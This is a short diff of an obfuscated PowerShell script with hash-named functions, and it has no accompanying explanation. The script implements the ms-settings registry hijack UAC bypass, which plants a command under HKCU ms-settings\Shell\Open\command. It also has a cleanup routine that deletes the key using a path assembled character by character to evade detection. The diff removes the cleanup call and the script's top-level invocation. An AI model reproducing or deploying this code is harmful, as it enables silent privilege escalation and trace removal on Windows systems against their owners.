@@ -5,7 +5,6 @@ function b1946ac92492d2347c6235b4d2611184 {
     New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
     New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
     Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $cmd -Force
-	c4ff45bb1fab99f9164b7fec14b2292a
 }
 
 function c4ff45bb1fab99f9164b7fec14b2292a {
@@ -15,5 +14,3 @@ function c4ff45bb1fab99f9164b7fec14b2292a {
 	$item = "H"+"K"+"C"+"U"+":"+"\"+"S"+"o"+"f"+"t"+"w"+"a"+"r"+"e"+"\"+"C"+"l"+"a"+"s"+"s"+"e"+"s"+"\"+"m"+"s"+"-"+"s"+"e"+"t"+"t"+"i"+"n"+"g"+"s"+"\"
     Remove-Item $item -Recurse -Force -ErrorAction SilentlyContinue
 }
-
-b1946ac92492d2347c6235b4d2611184
